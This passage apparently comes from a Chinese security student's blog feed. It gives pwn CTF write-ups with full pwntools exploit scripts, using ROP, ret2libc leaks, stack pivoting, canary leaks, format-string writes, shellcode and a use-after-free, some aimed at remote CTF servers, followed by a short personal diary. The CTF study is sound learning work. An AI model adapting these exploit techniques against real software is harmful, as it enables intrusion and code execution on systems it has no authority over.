<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x400670</span></span><br><span class="line">binsh = <span class="number">0x00601070</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0400933</span>) + p64(binsh) + p64(sys) </span><br><span class="line"><span class="comment">#400933为‘pop rdi,ret’</span></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<!--more-->
<p>需要注意到，这题是x64的，跟x86的做法（ctfwiki-basicROP-ret2libc1）有些不同。<br>
x64调用函数传递参数时先使用rdi、rsi、rdx、rcx、r8、r9（储存整数和指针）等，再用栈</p>
<h2 id="rop2">rop2</h2>
<p>wp:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop2&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x0400670</span></span><br><span class="line">gets = <span class="number">0x04006b0</span></span><br><span class="line">pop_rdi = <span class="number">0x0400933</span></span><br><span class="line">bss = <span class="number">0x006010A8</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(sys)</span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>卡在少了最开始的p64(pop_rdi) + p64(bss)</p>
<p>学长的解释是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">改变rdi的gadget地址 使其指向bss段的那个地址 </span><br></pre></td></tr></table></figure>
<h2 id="unusual">unusual</h2>
<p>用alpha3弄出一个Alphanumeric Shellcode</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span> asm(sc)</span><br><span class="line"><span class="comment">#sc.py</span></span><br><span class="line"></span><br><span class="line">python sc.py &gt; sc</span><br><span class="line"></span><br><span class="line">python alpha3/ALPHA3.py x64 <span class="built_in">ascii</span> mixedcase rax --<span class="built_in">input</span>=<span class="string">&quot;sc&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="hard-shelcode">hard_shelcode</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">sh = process(<span class="string">&quot;./hard_shellcode&quot;</span>)</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sub_rsp = asm(<span class="string">&#x27;sub rsp, 64&#x27;</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">&#x27;jmp rsp&#x27;</span>)</span><br><span class="line">gadget = <span class="number">0x04000EA</span></span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">&#x27;a&#x27;</span>*(<span class="number">64</span>-<span class="built_in">len</span>(sc)) + sub_rsp + jmp_rsp + <span class="string">&#x27;b&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(sub_rsp)-<span class="built_in">len</span>(jmp_rsp)) + gadget</span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27;*16 + sc + sub_rsp + jmp_rsp + &#x27;b&#x27;*(8-len(sub_rsp)-len(jmp_rsp)) + p64(gadget) </span></span><br><span class="line"><span class="comment">## sub rsp,48</span></span><br><span class="line"> </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>用gadget跳转到&quot;sub_rsp,jmp_rsp&quot;然后执行sc(shellcode)</p>
<h2 id="baby-migration">baby_migration</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./baby_migration&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x4011C8</span></span><br><span class="line">rbp = <span class="number">0x404060</span></span><br><span class="line"><span class="comment">#shell = asm(shellcraft.sh())</span></span><br><span class="line">shell = <span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span> + p64(rbp+<span class="number">300</span>) + p64(gets) </span><br><span class="line">payload2 = shell + <span class="string">&#x27;b&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(shell)) + p64(rbp ) + p64(rbp+<span class="number">300</span>-<span class="number">0x30</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTgwMzAuaHRt">https://bbs.pediy.com/thread-258030.htm<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YW55dW5mZW5nMy9hcnRpY2xlL2RldGFpbHMvNTE0NTYwNDk=">https://blog.csdn.net/yuanyunfeng3/article/details/51456049<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">栈迁移 的核心思想就是 将栈 的 esp 和 ebp 转移到一个 输入不受长度限制的 且可控制 的 址处，通常是 bss 段地址！ 在最后 ret 的时候 如果我们能够控制得 了 栈顶 esp指向的地址 就想到于 控制了 程序执行流！</span><br></pre></td></tr></table></figure>
<p>用pwntolls生成的shellcode执行不了，可能是因为太长？</p>
<h2 id="baby-canary">baby_canary</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./baby_canary&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;sec.arttnba3.cn&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./baby_canary&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pluto/Desktop/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x41</span></span><br><span class="line">p.send(payload1)	<span class="comment">#dont use sendline</span></span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line"></span><br><span class="line">canary = u32(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">payload2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(puts_plt) + p32(start) + p32(puts_got)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;flag!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()	</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0xc</span> + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>在覆盖’\x00’得到canary时不能用sendline</p>
<p>这题在本地弄不出来，在远程上就可以。发现是用的libc不一样，本机为libc6-i386_2.21-0ubuntu4_amd64，服务器上是libc6-i386_2.23-0ubuntu11.2_amd64</p>
<h1>ctfwiki</h1>
<h2 id="ROP">ROP</h2>
<h3 id="ret2libc3">ret2libc3</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">stack = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = stack + p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">recv1 = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts.got_addr= &quot;</span>,<span class="built_in">hex</span>(recv1))</span><br><span class="line"><span class="comment">#puts.got = cb0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x05fcb0</span></span><br><span class="line">sys_offset = <span class="number">0x03adb0</span></span><br><span class="line">binsh_offset = <span class="number">0x15bb0b</span> </span><br><span class="line"></span><br><span class="line">libc_base = recv1 - puts_offset</span><br><span class="line">sys_addr = libc_base + sys_offset</span><br><span class="line">binsh = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload2 = stack + p32(sys_addr) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>libc 对应的是libc6_2.23-0ubuntu11.2_i386，对此是完全没想到的…</p>
<p>讲的挺好的https://www.jianshu.com/p/83f55c55c173</p>
<h1>XCTF进阶</h1>
<h2 id="实时数据监测">实时数据监测</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">35866</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,<span class="number">0x0804a048</span>,<span class="number">0x02223322</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGF6aHVhbmxhbi5jb20vMjAxOS8xMS8wNy81ZGMzZDY3NjM1ZGZlLw==">https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/<i class="fa fa-external-link-alt"></i></span></p>
<p>用ctfwiki提供的脚本比较快，自己试挺麻烦的…（还是不太熟练</p>
<h2 id="welpwn">welpwn</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./8&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">32410</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./8&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">sys_off = <span class="number">0x045390</span></span><br><span class="line">write_off = <span class="number">0x0f72b0</span></span><br><span class="line">binsh_off = <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">pop = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x04008a3</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(<span class="number">0x4007CD</span>)</span><br><span class="line"><span class="comment">#0x18+pop(8个字节)用于复制（下一个函数）后填充第二个栈到返回地址，然后将write的got表pop到rdi，用puts输出，返回到main函数的开头，设置环境</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_addr = p.recvuntil(&quot;\\&quot;)</span></span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\00&#x27;</span>))</span><br><span class="line">write_addr = <span class="built_in">int</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> write_addr</span><br><span class="line">base = write_addr - write_off</span><br><span class="line">sys = base + sys_off</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>好像服务器上和本地程序用的libc又不一样…所以连接完远程服务器后再获得一次write的got表，然后找到libc版本</p>
<p>主要学到了这个方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\00&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>将接收到的数字左对齐，并用’\00’填充为8位，</p>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tdXppYmluZy5naXRodWIuaW8vMjAyMC8wNi8xMi8yMDIwLjA2LjEyJUVGJUJDJTg4MTI1JUVGJUJDJTg5">https://muzibing.github.io/2020/06/12/2020.06.12（125）<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="monkey">monkey</h2>
<p>考察js shell</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ nc <span class="number">220.249</span><span class="number">.52</span><span class="number">.133</span> <span class="number">56451</span></span><br><span class="line">js&gt; os.system(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">/home/ctf</span><br><span class="line">js&gt; os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line">js&gt; os.system(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">cyberpeace&#123;xxxxxxx&#125;</span><br></pre></td></tr></table></figure>
<h2 id=""></h2>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>第六届网络空间安全技术赛pwn</title>
    <url>/54551.html</url>
    <content><![CDATA[<p>比赛没参加，本篇纯属因为无聊才写的(一个多月没做pwn了，顺便复习一下exp咋写…)</p>
<span id="more"></span>
<p><a href="">题目</a></p>
<h1>small</h1>
<p>应该是签到题吧<br>
checksec一看，保护全没开，极有可能<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508154649.png" alt="20210508154649"><br>
向大小为0x10的栈read 0x400个字节，很直接的想法就是输入shellcode然后跳转执行<br>
再一看下方有一个大小为0x50的bss段，exp差不多就能出来了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./small&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x402020</span>) + p64(<span class="number">0x401015</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x402020</span>) + p64(<span class="number">0x402030</span>) + shellcode</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>上学期西电新生赛的栈迁移都比这个灵活</p>
<h1>bank</h1>
<p>checksec:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508195950.png" alt="20210508195950"><br>
拖到ida里：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202927.png" alt="20210508202927"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202941.png" alt="20210508202941"><br>
先判断输入的password，然后printf存在很明显的格式化字符串漏洞，用于打印flag</p>
<p>其中格式化字符串的漏洞只需要能够读栈上的值即可，这题的有意思的点在于爆破绕过strcmp<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212659.png" alt="20210508212659"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212648.png" alt="20210508212648"><br>
注：fgets读取到“\n”时结束</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	i+=<span class="number">1</span></span><br><span class="line">    p=process(<span class="string">&quot;./bank&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your account:\n&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your password:\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">	<span class="comment">#p.sendlineafter(&quot;Do you want to check your account balance?\n&quot;,&quot;yes&quot;)</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input your private code: \n&quot;</span>,<span class="string">&quot;%8$s&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>18年网鼎杯有个跟/dev/urandom有关的题目，<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDY1OTAuaHRtJUVGJUJDJThDJUU4JTlCJUFFJUU2JTlDJTg5JUU2JTg0JThGJUU2JTgwJTlEJUU3JTlBJTg0JUVGJUJDJThDbGludXglRTklQkIlOTglRTglQUUlQTQlRTUlOEQlOTUlRTQlQjglQUElRTglQkYlOUIlRTclQTglOEIlRTYlODklOTMlRTUlQkMlODAlRTclOUElODQlRTYlOUMlODAlRTUlQTQlQTclRTYlOTYlODclRTQlQkIlQjYlRTYlOTUlQjAlRTQlQjglQkExMDI0">https://bbs.pediy.com/thread-246590.htm，蛮有意思的，linux默认单个进程打开的最大文件数为1024<i class="fa fa-external-link-alt"></i></span></p>
<h1>managebook</h1>
<p>常规的uaf，类似经典的hacknote</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./managebooks&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./managebooks&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size,name,summary_size,summary</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book name: &quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary size: &quot;</span>,<span class="built_in">str</span>(summary_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary: &quot;</span>,summary)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">num,size,summary</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Select Book ID (0-10): &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary: &quot;</span>,summary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Select Book ID (0-10): &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;aaaa&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x18</span>,p64(puts_plt)+p64(<span class="number">0</span>)+p64(puts_got))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_addr= u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">sys = puts_addr - <span class="number">0x2a300</span></span><br><span class="line">binsh = puts_addr + <span class="number">0x11d777</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x18</span>,p64(sys) + p64(<span class="number">0</span>) + p64(binsh))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>非定期のDiary</title>
    <url>/39190.html</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>
<p>感觉写周报不是特别实用，看到Sakura师傅的日记，觉得按天来记录挺合适的</p>
<p>鸽了一个月才开始写…</p>
<h3 id="2020-11-28">2020-11-28</h3>
<p>在新电脑上配好了github pages+hexo，主要是安装nodejs、git、hexo，然后连接github上的账户</p>
<p>然后deploy的时候发现报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TypeError [ERR_INVALID_ARG_TYPE]: The &quot;mode&quot; argument must be integer. Received an instance of Objec</span><br></pre></td></tr></table></figure>
<p>查了之后发现可能是nodejs版本太高了…<br>
不整了，先学习</p>
<p>一个多月前开始想学iot_sec。上周找学习路线和资料，并开始尝试arm汇编，结果qemu的环境都整不出来。期间和几位大师傅聊了一下，决定还是先学二进制，把方法论先掌握了。</p>
<p>开始学heap。</p>
<h3 id="2020-12-3">2020-12-3</h3>
<p>这两天在攻防世界上写了四题。一题堆，三题栈，其中一题发了个wp在攻防世界上。前两题还行，后面两题都卡在了莫名其妙的地方，解决了之后还是不是特别理解，但大抵都是pwntools使用上的问题，花太多时间纠结在这方面感觉有点浪费时间，但还是有些收获的。<br>
再看一点pwn题、ctfwiki、逆向技术之后，应该可以开始realworld的漏洞了。最近不知道为啥挺焦虑的，可能是因为学长要去绿盟or科恩实习&amp;上次交流的科恩大哥也说明年可以去投几个实验室实习？（但我要考研的话应该可以不急着实习吧…)。写着写着突然觉得是不是因为酸web安全和前端后端他们了，前一阵子想转iot估计也是因为没有太多正向激励？<br>
好好学习！</p>
<h3 id="2020-12-17">2020-12-17</h3>
